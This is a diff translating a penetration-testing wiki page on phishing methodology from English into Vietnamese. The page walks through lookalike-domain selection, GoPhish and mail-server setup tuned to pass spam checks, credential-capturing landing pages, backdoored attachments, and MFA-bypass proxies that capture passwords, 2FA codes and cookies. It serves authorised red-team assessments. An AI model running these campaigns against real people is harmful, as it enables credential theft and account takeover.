@@ -1,50 +1,50 @@
-# Phishing Methodology
+# Phương pháp Phishing
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Methodology
+## Phương pháp
 
-1. Recon the victim
-   1. Select the **victim domain**.
-   2. Perform some basic web enumeration **searching for login portals** used by the victim and **decide** which one you will **impersonate**.
-   3. Use some **OSINT** to **find emails**.
-2. Prepare the environment
-   1. **Buy the domain** you are going to use for the phishing assessment
-   2. **Configure the email service** related records (SPF, DMARC, DKIM, rDNS)
-   3. Configure the VPS with **gophish**
-3. Prepare the campaign
-   1. Prepare the **email template**
-   2. Prepare the **web page** to steal the credentials
-4. Launch the campaign!
+1. Trinh sát nạn nhân
+   1. Chọn **domain của nạn nhân**.
+   2. Thực hiện một số hoạt động liệt kê web cơ bản, **tìm các cổng đăng nhập** mà nạn nhân sử dụng và **quyết định** cổng nào bạn sẽ **giả mạo**.
+   3. Sử dụng **OSINT** để **tìm email**.
+2. Chuẩn bị môi trường
+   1. **Mua domain** bạn sẽ sử dụng cho đợt đánh giá phishing
+   2. **Cấu hình các bản ghi liên quan đến dịch vụ email** (SPF, DMARC, DKIM, rDNS)
+   3. Cấu hình VPS với **gophish**
+3. Chuẩn bị chiến dịch
+   1. Chuẩn bị **mẫu email**
+   2. Chuẩn bị **trang web** để đánh cắp thông tin xác thực
+4. Khởi chạy chiến dịch!
 
-## Generate similar domain names or buy a trusted domain
+## Tạo các tên domain tương tự hoặc mua domain đáng tin cậy
 
-### Domain Name Variation Techniques
+### Kỹ thuật biến đổi tên domain
 
-- **Keyword**: The domain name **contains** an important **keyword** of the original domain (e.g., zelster.com-management.com).<sup>[[1]](#references)</sup>
-- **hypened subdomain**: Change the **dot for a hyphen** of a subdomain (e.g., www-zelster.com).
-- **New TLD**: Same domain using a **new TLD** (e.g., zelster.org)
-- **Homoglyph**: It **replaces** a letter in the domain name with **letters that look similar** (e.g., zelfser.com).
+- **Keyword**: Tên domain **chứa** một **keyword** quan trọng của domain gốc (ví dụ: zelster.com-management.com).<sup>[[1]](#references)</sup>
+- **hypened subdomain**: Đổi **dấu chấm thành dấu gạch nối** trong subdomain (ví dụ: www-zelster.com).
+- **New TLD**: Sử dụng cùng domain với một **TLD mới** (ví dụ: zelster.org)
+- **Homoglyph**: **Thay thế** một chữ cái trong tên domain bằng **chữ cái trông tương tự** (ví dụ: zelfser.com).
 
 
 {{#ref}}
 homograph-attacks.md
 {{#endref}}
-- **Transposition:** It **swaps two letters** within the domain name (e.g., zelsetr.com).
-- **Singularization/Pluralization**: Adds or removes “s” at the end of the domain name (e.g., zeltsers.com).
-- **Omission**: It **removes one** of the letters from the domain name (e.g., zelser.com).
-- **Repetition:** It **repeats one** of the letters in the domain name (e.g., zeltsser.com).
-- **Replacement**: Like homoglyph but less stealthy. It replaces one of the letters in the domain name, perhaps with a letter in proximity of the original letter on the keyboard (e.g, zektser.com).
-- **Subdomained**: Introduce a **dot** inside the domain name (e.g., ze.lster.com).
-- **Insertion**: It **inserts a letter** into the domain name (e.g., zerltser.com).
-- **Missing dot**: Append the TLD to the domain name. (e.g., zelstercom.com)
+- **Transposition:** **Đổi chỗ hai chữ cái** trong tên domain (ví dụ: zelsetr.com).
+- **Singularization/Pluralization**: Thêm hoặc xóa chữ “s” ở cuối tên domain (ví dụ: zeltsers.com).
+- **Omission**: **Xóa một** chữ cái khỏi tên domain (ví dụ: zelser.com).
+- **Repetition:** **Lặp lại một** chữ cái trong tên domain (ví dụ: zeltsser.com).
+- **Replacement**: Tương tự Homoglyph nhưng ít kín đáo hơn. Thay thế một chữ cái trong tên domain, có thể bằng một chữ cái nằm gần chữ cái gốc trên bàn phím (ví dụ: zektser.com).
+- **Subdomained**: Chèn một **dấu chấm** vào bên trong tên domain (ví dụ: ze.lster.com).
+- **Insertion**: **Chèn một chữ cái** vào tên domain (ví dụ: zerltser.com).
+- **Missing dot**: Nối TLD vào tên domain (ví dụ: zelstercom.com)
 
-**Automatic Tools**
+**Công cụ tự động**
 
 - [**dnstwist**](https://github.com/elceef/dnstwist)
 - [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)
 
-**Websites**
+**Trang web**
 
 - [https://dnstwist.it/](https://dnstwist.it)
 - [https://dnstwister.report/](https://dnstwister.report)
@@ -52,53 +52,53 @@ homograph-attacks.md
 
 ### Bitflipping
 
-There is a **possibility that one of some bits stored or in communication might get automatically flipped** due to various factors like solar flares, cosmic rays, or hardware errors.
+Có **khả năng một số bit được lưu trữ hoặc đang truyền tải tự động bị đảo trạng thái** do nhiều yếu tố như bão mặt trời, tia vũ trụ hoặc lỗi phần cứng.
 
-When this concept is **applied to DNS requests**, it is possible that the **domain received by the DNS server** is not the same as the domain initially requested.
+Khi khái niệm này được **áp dụng vào các yêu cầu DNS**, domain mà **máy chủ DNS nhận được** có thể không giống với domain được yêu cầu ban đầu.
 
-For example, a single bit modification in the domain "windows.com" can change it to "windnws.com."
+Ví dụ, việc sửa đổi một bit trong domain "windows.com" có thể biến nó thành "windnws.com."
 
-Attackers may **take advantage of this by registering multiple bit-flipping domains** that are similar to the victim's domain. Their intention is to redirect legitimate users to their own infrastructure.
+Kẻ tấn công có thể **lợi dụng điều này bằng cách đăng ký nhiều domain bị ảnh hưởng bởi bit-flipping** có tên tương tự domain của nạn nhân. Mục đích của chúng là chuyển hướng người dùng hợp pháp đến hạ tầng của chúng.
 
-For more information read [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>
+Để biết thêm thông tin, hãy đọc [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>
 
-### Buy a trusted domain
+### Mua domain đáng tin cậy
 
-You can search in [https://www.expireddomains.net/](https://www.expireddomains.net) for a expired domain that you could use.\
-In order to make sure that the expired domain that you are going to buy **has already a good SEO** you could search how is it categorized in:
+Bạn có thể tìm kiếm domain đã hết hạn mà mình có thể sử dụng tại [https://www.expireddomains.net/](https://www.expireddomains.net).\
+Để đảm bảo domain đã hết hạn mà bạn định mua **đã có SEO tốt**, bạn có thể kiểm tra cách domain được phân loại tại:
 
 - [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
 - [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)
 
-## Discovering Emails
+## Tìm email
 
-- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
-- [https://phonebook.cz/](https://phonebook.cz) (100% free)
+- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (miễn phí 100%)
+- [https://phonebook.cz/](https://phonebook.cz) (miễn phí 100%)
 - [https://maildb.io/](https://maildb.io)
 - [https://hunter.io/](https://hunter.io)
 - [https://anymailfinder.com/](https://anymailfinder.com)
 
-In order to **discover more** valid email addresses or **verify the ones** you have already discovered you can check if you can brute-force them smtp servers of the victim. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
-Moreover, don't forget that if the users use **any web portal to access their mails**, you can check if it's vulnerable to **username brute force**, and exploit the vulnerability if possible.
+Để **tìm thêm** địa chỉ email hợp lệ hoặc **xác minh những địa chỉ** bạn đã tìm thấy, bạn có thể kiểm tra xem mình có thể brute-force máy chủ SMTP của nạn nhân hay không. [Tìm hiểu cách xác minh/tìm địa chỉ email tại đây](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
+Ngoài ra, đừng quên rằng nếu người dùng sử dụng **bất kỳ cổng web nào để truy cập email**, bạn có thể kiểm tra xem cổng đó có dễ bị **brute-force username** hay không và khai thác lỗ hổng nếu có thể.
 
-## Configuring GoPhish
+## Cấu hình GoPhish
 
-### Installation
+### Cài đặt
 
-You can download it from [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)
+Bạn có thể tải xuống từ [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)
 
-Download and decompress it inside `/opt/gophish` and execute `/opt/gophish/gophish`\
-You will be given a password for the admin user in port 3333 in the output. Therefore, access that port and use those credentials to change the admin password. You may need to tunnel that port to local:
+Tải xuống và giải nén vào `/opt/gophish`, sau đó chạy `/opt/gophish/gophish`\
+Mật khẩu cho người dùng admin ở cổng 3333 sẽ được hiển thị trong đầu ra. Vì vậy, hãy truy cập cổng đó và dùng thông tin xác thực này để đổi mật khẩu admin. Bạn có thể cần tunnel cổng đó về máy cục bộ:
 
 ```bash
 ssh -L 3333:127.0.0.1:3333 <user>@<ip>
 ```
 
-### Configuration
+### Cấu hình
 
-**TLS certificate configuration**
+**Cấu hình chứng chỉ TLS**
 
-Before this step you should have **already bought the domain** you are going to use and it must be **pointing** to the **IP of the VPS** where you are configuring **gophish**.
+Trước bước này, bạn cần **mua domain** định sử dụng và domain đó phải **trỏ** đến **IP của VPS** nơi bạn đang cấu hình **gophish**.
 
 ```bash
 DOMAIN="<domain>"
@@ -116,36 +116,36 @@ cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
 cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
 ```
 
-**Mail configuration**
+**Cấu hình Mail**
 
-Start installing: `apt-get install postfix`
+Bắt đầu cài đặt: `apt-get install postfix`
 
-Then add the domain to the following files:
+Sau đó thêm domain vào các file sau:
 
 - **/etc/postfix/virtual_domains**
 - **/etc/postfix/transport**
 - **/etc/postfix/virtual_regexp**
 
-**Change also the values of the following variables inside /etc/postfix/main.cf**
+**Đồng thời thay đổi giá trị của các biến sau trong /etc/postfix/main.cf**
 
 `myhostname = <domain>`\
 `mydestination = $myhostname, <domain>, localhost.com, localhost`
 
-Finally modify the files **`/etc/hostname`** and **`/etc/mailname`** to your domain name and **restart your VPS.**
+Cuối cùng, sửa các file **`/etc/hostname`** và **`/etc/mailname`** thành tên domain của bạn rồi **khởi động lại VPS.**
 
-Now, create a **DNS A record** of `mail.<domain>` pointing to the **ip address** of the VPS and a **DNS MX** record pointing to `mail.<domain>`
+Bây giờ, tạo một **DNS A record** cho `mail.<domain>` trỏ đến **địa chỉ IP** của VPS và một **DNS MX record** trỏ đến `mail.<domain>`
 
-Now lets test to send an email:
+Bây giờ hãy thử gửi email:
 
 ```bash
 apt install mailutils
 echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
 ```
 
-**Gophish configuration**
+**Cấu hình Gophish**
 
-Stop the execution of gophish and lets configure it.\
-Modify `/opt/gophish/config.json` to the following (note the use of https):
+Dừng gophish và hãy cấu hình nó.\
+Sửa `/opt/gophish/config.json` thành như sau (lưu ý sử dụng https):
 
 ```bash
 {
@@ -172,9 +172,9 @@ Modify `/opt/gophish/config.json` to the following (note the use of https):
 }
 ```
 
-**Configure gophish service**
+**Cấu hình dịch vụ gophish**
 
-In order to create the gophish service so it can be started automatically and managed a service you can create the file `/etc/init.d/gophish` with the following content:
+Để tạo dịch vụ gophish có thể tự động khởi động và được quản lý như một dịch vụ, bạn có thể tạo tệp `/etc/init.d/gophish` với nội dung sau:
 
 ```bash
 #!/bin/bash
@@ -223,7 +223,7 @@ case $1 in
 esac
 ```
 
-Finish configuring the service and checking it doing:
+Hoàn tất cấu hình dịch vụ và kiểm tra dịch vụ bằng cách:
 
 ```bash
 mkdir /var/log/gophish
@@ -236,37 +236,37 @@ ss -l | grep "3333\|443"
 service gophish stop
 ```
 
-## Configuring mail server and domain
+## Cấu hình mail server và domain
 
-### Wait & be legit
+### Chờ đợi & tạo uy tín
 
-The older a domain is the less probable it's going to be caught as spam. Then you should wait as much time as possible (at least 1week) before the phishing assessment. moreover, if you put a page about a reputational sector the reputation obtained will be better.
+Domain càng lâu đời thì càng ít có khả năng bị đánh dấu là spam. Vì vậy, bạn nên chờ lâu nhất có thể (ít nhất 1 tuần) trước khi thực hiện đánh giá phishing. Ngoài ra, nếu bạn đăng một trang về lĩnh vực có uy tín thì domain sẽ có được uy tín tốt hơn.
 
-Note that even if you have to wait a week you can finish configuring everything now.
+Lưu ý rằng dù phải chờ một tuần, bạn vẫn có thể hoàn tất cấu hình mọi thứ ngay bây giờ.
 
-### Configure Reverse DNS (rDNS) record
+### Cấu hình bản ghi Reverse DNS (rDNS)
 
-Set a rDNS (PTR) record that resolves the IP address of the VPS to the domain name.
+Thiết lập bản ghi rDNS (PTR) để phân giải địa chỉ IP của VPS thành tên domain.
 
-### Sender Policy Framework (SPF) Record
+### Bản ghi Sender Policy Framework (SPF)
 
-You must **configure a SPF record for the new domain**. If you don't know what is a SPF record [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).
+Bạn phải **cấu hình bản ghi SPF cho domain mới**. Nếu bạn chưa biết bản ghi SPF là gì, hãy [**đọc trang này**](../../network-services-pentesting/pentesting-smtp/index.html#spf).
 
-You can use [https://www.spfwizard.net/](https://www.spfwizard.net) to generate your SPF policy (use the IP of the VPS machine)
+Bạn có thể dùng [https://www.spfwizard.net/](https://www.spfwizard.net) để tạo chính sách SPF (dùng IP của máy VPS).
 
-![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)
+![Biểu mẫu SPF Wizard để tạo bản ghi SPF cho domain phishing](<../../images/image (1037).png>)
 
-This is the content that must be set inside a TXT record inside the domain:
+Đây là nội dung cần được thiết lập trong bản ghi TXT của domain:
 
 ```bash
 v=spf1 mx a ip4:ip.ip.ip.ip ?all
 ```
 
-### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record
+### Bản ghi Domain-based Message Authentication, Reporting & Conformance (DMARC)
 
-You must **configure a DMARC record for the new domain**. If you don't know what is a DMARC record [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).
+Bạn phải **cấu hình bản ghi DMARC cho domain mới**. Nếu bạn chưa biết bản ghi DMARC là gì, hãy [**đọc trang này**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).
 
-You have to create a new DNS TXT record pointing the hostname `_dmarc.<domain>` with the following content:
+Bạn cần tạo một bản ghi DNS TXT mới, trỏ hostname `_dmarc.<domain>` đến nội dung sau:
 
 ```bash
 v=DMARC1; p=none
@@ -274,28 +274,28 @@ v=DMARC1; p=none
 
 ### DomainKeys Identified Mail (DKIM)
 
-You must **configure a DKIM for the new domain**. If you don't know what is a DKIM record [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).
+Bạn phải **cấu hình DKIM cho domain mới**. Nếu bạn chưa biết bản ghi DKIM là gì, [**hãy đọc trang này**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).
 
-This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>
+Hướng dẫn này dựa trên: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>
 
 > [!TIP]
-> You need to concatenate both B64 values that the DKIM key generates:
+> Bạn cần nối cả hai giá trị B64 mà khóa DKIM tạo ra:
 >
 > ```
 > v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
 > ```
 
-### Test your email configuration score
+### Kiểm tra điểm cấu hình email của bạn
 
-You can do that using [https://www.mail-tester.com/](https://www.mail-tester.com)\
-Just access the page and send an email to the address they give you:
+Bạn có thể làm điều đó bằng cách dùng [https://www.mail-tester.com/](https://www.mail-tester.com)\
+Chỉ cần truy cập trang và gửi email đến địa chỉ họ cung cấp:
 
 ```bash
 echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
 ```
 
-You can also **check your email configuration** sending an email to `check-auth@verifier.port25.com` and **reading the response** (for this you will need to **open** port **25** and see the response in the file _/var/mail/root_ if you send the email a as root).\
-Check that you pass all the tests:
+Bạn cũng có thể **kiểm tra cấu hình email** bằng cách gửi email đến `check-auth@verifier.port25.com` và **đọc phản hồi** (để làm việc này, bạn cần **mở** port **25** và xem phản hồi trong file _/var/mail/root_ nếu gửi email với tư cách root).\
+Đảm bảo bạn vượt qua tất cả các bài kiểm tra:
 
 ```bash
 ==========================================================
@@ -308,7 +308,7 @@ Sender-ID check:    pass
 SpamAssassin check: ham
 ```
 
-You could also send **message to a Gmail under your control**, and check the **email’s headers** in your Gmail inbox, `dkim=pass` should be present in the `Authentication-Results` header field.
+Bạn cũng có thể gửi **tin nhắn đến một tài khoản Gmail do bạn kiểm soát**, rồi kiểm tra **headers của email** trong hộp thư đến Gmail của bạn; `dkim=pass` phải xuất hiện trong trường header `Authentication-Results`.
 
 ```
 Authentication-Results: mx.google.com;
@@ -316,34 +316,34 @@ Authentication-Results: mx.google.com;
        dkim=pass header.i=@example.com;
 ```
 
-### ​Removing from Spamhouse Blacklist
+### ​Gỡ khỏi danh sách đen Spamhouse
 
-The page [www.mail-tester.com](https://www.mail-tester.com) can indicate you if you your domain is being blocked by spamhouse. You can request your domain/IP to be removed at: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)
+Trang [www.mail-tester.com](https://www.mail-tester.com) có thể cho bạn biết liệu domain của bạn có bị spamhouse chặn hay không. Bạn có thể yêu cầu gỡ domain/IP tại: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)
 
-### Removing from Microsoft Blacklist
+### Gỡ khỏi danh sách đen Microsoft
 
-​​You can request your domain/IP to be removed at [https://sender.office.com/](https://sender.office.com).
+​​Bạn có thể yêu cầu gỡ domain/IP tại [https://sender.office.com/](https://sender.office.com).
 
-## Create & Launch GoPhish Campaign
+## Tạo và khởi chạy chiến dịch GoPhish
 
-### Sending Profile
+### Hồ sơ gửi
 
-- Set some **name to identify** the sender profile
-- Decide from which account are you going to send the phishing emails. Suggestions: _noreply, support, servicedesk, salesforce..._
-- You can leave blank the username and password, but make sure to check the Ignore Certificate Errors
+- Đặt một **tên để nhận diện** hồ sơ gửi
+- Quyết định tài khoản nào sẽ được dùng để gửi email phishing. Gợi ý: _noreply, support, servicedesk, salesforce..._
+- Bạn có thể để trống username và password, nhưng nhớ chọn Ignore Certificate Errors
 
-![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)
+![Tạo và khởi chạy chiến dịch GoPhish - Hồ sơ gửi: Bạn có thể để trống username và password, nhưng nhớ chọn Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)
 
 > [!TIP]
-> It's recommended to use the "**Send Test Email**" functionality to test that everything is working.\
-> I would recommend to **send the test emails to 10min mails addresses** in order to avoid getting blacklisted making tests.
+> Bạn nên dùng chức năng "**Send Test Email**" để kiểm tra xem mọi thứ có hoạt động hay không.\
+> Tôi khuyên bạn nên **gửi email thử nghiệm đến các địa chỉ email 10min** để tránh bị đưa vào danh sách đen khi thử nghiệm.
 
-### Email Template
+### Mẫu email
 
-- Set some **name to identify** the template
-- Then write a **subject** (nothing estrange, just something you could expect to read in a regular email)
-- Make sure you have checked "**Add Tracking Image**"
-- Write the **email template** (you can use variables like in the following example):
+- Đặt một **tên để nhận diện** mẫu
+- Sau đó viết **tiêu đề** (đừng viết gì quá lạ, chỉ cần nội dung mà bạn có thể thấy trong một email thông thường)
+- Nhớ chọn "**Add Tracking Image**"
+- Viết **mẫu email** (bạn có thể dùng các biến như trong ví dụ sau):
 
 ```html
 <html>
@@ -364,63 +364,63 @@ WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY
 </html>
 ```
 
-Note that **in order to increase the credibility of the email**, it's recommended to use some signature from an email from the client. Suggestions:
+Lưu ý rằng **để tăng độ tin cậy của email**, bạn nên sử dụng chữ ký trong một email của khách hàng. Gợi ý:
 
-- Send an email to a **non existent address** and check if the response has any signature.
-- Search for **public emails** like info@ex.com or press@ex.com or public@ex.com and send them an email and wait for the response.
-- Try to contact **some valid discovered** email and wait for the response
+- Gửi email đến một **địa chỉ không tồn tại** và kiểm tra xem phản hồi có chữ ký hay không.
+- Tìm các **email công khai** như info@ex.com, press@ex.com hoặc public@ex.com, gửi email đến đó rồi chờ phản hồi.
+- Thử liên hệ với một email **hợp lệ đã tìm được** rồi chờ phản hồi.
 
-![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)
-
-> [!TIP]
-> The Email Template also allows to **attach files to send**. If you would also like to steal NTLM challenges using some specially crafted files/documents [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).
-
-### Landing Page
-
-- Write a **name**
-- **Write the HTML code** of the web page. Note that you can **import** web pages.
-- Mark **Capture Submitted Data** and **Capture Passwords**
-- Set a **redirection**
-
-![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)
+![Hồ sơ gửi - Mẫu email: Thử liên hệ với một email hợp lệ đã tìm được rồi chờ phản hồi](<../../images/image (80).png>)
 
 > [!TIP]
-> Usually you will need to modify the HTML code of the page and make some tests in local (maybe using some Apache server) **until you like the results.** Then, write that HTML code in the box.\
-> Note that if you need to **use some static resources** for the HTML (maybe some CSS and JS pages) you can save them in _**/opt/gophish/static/endpoint**_ and then access them from _**/static/\<filename>**_
+> Mẫu email cũng cho phép **đính kèm tệp để gửi**. Nếu bạn cũng muốn đánh cắp NTLM challenge bằng một số tệp/tài liệu được tạo đặc biệt, [hãy đọc trang này](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).
+
+### Trang đích
+
+- Điền **tên**
+- **Viết mã HTML** cho trang web. Lưu ý rằng bạn có thể **nhập** trang web.
+- Đánh dấu **Capture Submitted Data** và **Capture Passwords**
+- Thiết lập **chuyển hướng**
+
+![Mẫu email - Trang đích: Đánh dấu Capture Submitted Data và Capture Passwords](<../../images/image (826).png>)
 
 > [!TIP]
-> For the redirection you could **redirect the users to the legit main web page** of the victim, or redirect them to _/static/migration.html_ for example, put some **spinning wheel (**[**https://loading.io/**](https://loading.io)**) for 5 seconds and then indicate that the process was successful**.
+> Thông thường, bạn sẽ cần chỉnh sửa mã HTML của trang và thử nghiệm cục bộ (có thể dùng một máy chủ Apache) **cho đến khi hài lòng với kết quả.** Sau đó, viết mã HTML đó vào ô.\
+> Lưu ý rằng nếu cần **dùng tài nguyên tĩnh** cho HTML (có thể là một số trang CSS và JS), bạn có thể lưu chúng trong _**/opt/gophish/static/endpoint**_ rồi truy cập từ _**/static/\<filename>**_
 
-### Users & Groups
+> [!TIP]
+> Để chuyển hướng, bạn có thể **chuyển người dùng đến trang web chính thức của nạn nhân**, hoặc chuyển họ đến _/static/migration.html_ chẳng hạn, hiển thị một **vòng xoay tải (**[**https://loading.io/**](https://loading.io)**) trong 5 giây rồi thông báo rằng quá trình đã thành công**.
 
-- Set a name
-- **Import the data** (note that in order to use the template for the example you need the firstname, last name and email address of each user)
+### Người dùng & Nhóm
 
-![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)
+- Đặt tên
+- **Nhập dữ liệu** (lưu ý rằng để dùng mẫu trong ví dụ, bạn cần họ, tên và địa chỉ email của từng người dùng)
 
-### Campaign
+![Trang đích - Người dùng & Nhóm: Nhập dữ liệu (lưu ý rằng để dùng mẫu trong ví dụ, bạn cần họ, tên và địa chỉ email của từng người dùng)](<../../images/image (163).png>)
 
-Finally, create a campaign selecting a name, the email template, the landing page, the URL, the sending profile and the group. Note that the URL will be the link sent to the victims
+### Chiến dịch
 
-Note that the **Sending Profile allow to send a test email to see how will the final phishing email looks like**:
+Cuối cùng, tạo một chiến dịch bằng cách chọn tên, mẫu email, trang đích, URL, hồ sơ gửi và nhóm. Lưu ý rằng URL sẽ là liên kết được gửi cho nạn nhân.
 
-![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)
+Lưu ý rằng **Hồ sơ gửi cho phép gửi email thử nghiệm để xem email Phishing cuối cùng sẽ trông như thế nào**:
 
-Once everything is ready, just launch the campaign!
+![Người dùng & Nhóm - Chiến dịch: Lưu ý rằng Hồ sơ gửi cho phép gửi email thử nghiệm để xem email Phishing cuối cùng sẽ trông như thế nào](<../../images/image (192).png>)
 
-## Website Cloning
+Khi mọi thứ đã sẵn sàng, hãy khởi chạy chiến dịch!
 
-If for any reason you want to clone the website check the following page:
+## Sao chép trang web
+
+Nếu vì lý do nào đó bạn muốn sao chép trang web, hãy xem trang sau:
 
 
 {{#ref}}
 clone-a-website.md
 {{#endref}}
 
-## Backdoored Documents & Files
+## Tài liệu & Tệp cài backdoor
 
-In some phishing assessments (mainly for Red Teams) you will want to also **send files containing some kind of backdoor** (maybe a C2 or maybe just something that will trigger an authentication).\
-Check out the following page for some examples:
+Trong một số đợt đánh giá Phishing (chủ yếu là với Red Team), bạn cũng sẽ muốn **gửi các tệp có chứa một dạng backdoor nào đó** (có thể là C2 hoặc chỉ là thứ gì đó kích hoạt xác thực).\
+Xem trang sau để biết một số ví dụ:
 
 
 {{#ref}}
@@ -429,55 +429,55 @@ phishing-documents.md
 
 ## Phishing MFA
 
-### Via Proxy MitM
+### Qua Proxy MitM
 
-The previous attack is pretty clever as you are faking a real website and gathering the information set by the user. Unfortunately, if the user didn't put the correct password or if the application you faked is configured with 2FA, **this information won't allow you to impersonate the tricked user**.
+Cuộc tấn công trước khá tinh vi vì bạn giả mạo một trang web thật và thu thập thông tin người dùng nhập vào. Đáng tiếc, nếu người dùng nhập sai mật khẩu hoặc ứng dụng bạn giả mạo được cấu hình với 2FA, **thông tin này sẽ không giúp bạn mạo danh người dùng bị lừa**.
 
-This is where tools like [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) and [**muraena**](https://github.com/muraenateam/muraena) are useful. This tool will allow you to generate a MitM like attack. Basically, the attacks works in the following way:
+Đây là lúc các công cụ như [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) và [**muraena**](https://github.com/muraenateam/muraena) phát huy tác dụng. Công cụ này cho phép bạn thực hiện một cuộc tấn công kiểu MitM. Về cơ bản, cuộc tấn công diễn ra như sau:
 
-1. You **impersonate the login** form of the real webpage.
-2. The user **send** his **credentials** to your fake page and the tool send those to the real webpage, **checking if the credentials work**.
-3. If the account is configured with **2FA**, the MitM page will ask for it and once the **user introduces** it the tool will send it to the real web page.
-4. Once the user is authenticated you (as attacker) will have **captured the credentials, the 2FA, the cookie and any information** of every interaction your while the tool is performing a MitM.
+1. Bạn **giả mạo biểu mẫu đăng nhập** của trang web thật.
+2. Người dùng **gửi** **thông tin đăng nhập** đến trang giả mạo của bạn, rồi công cụ gửi chúng đến trang web thật, **kiểm tra xem thông tin đăng nhập có hợp lệ không**.
+3. Nếu tài khoản được cấu hình với **2FA**, trang MitM sẽ yêu cầu mã này và khi **người dùng nhập** mã, công cụ sẽ gửi mã đến trang web thật.
+4. Khi người dùng đã xác thực, bạn (với tư cách kẻ tấn công) sẽ **thu thập được thông tin đăng nhập, 2FA, cookie và mọi thông tin** từ các tương tác của người dùng trong lúc công cụ đang thực hiện MitM.
 
-### Via VNC
+### Qua VNC
 
-What if instead of **sending the victim to a malicious page** with the same looks as the original one, you send him to a **VNC session with a browser connected to the real web page**? You will be able to see what he does, steal the password, the MFA used, the cookies...\
-You can do this with [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>
+Nếu thay vì **đưa nạn nhân đến một trang độc hại** có giao diện giống trang gốc, bạn đưa họ đến một **phiên VNC có trình duyệt kết nối với trang web thật** thì sao? Bạn sẽ có thể xem họ làm gì, đánh cắp mật khẩu, MFA được sử dụng, cookie...\
+Bạn có thể làm việc này bằng [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>
 
-## Detecting the detection
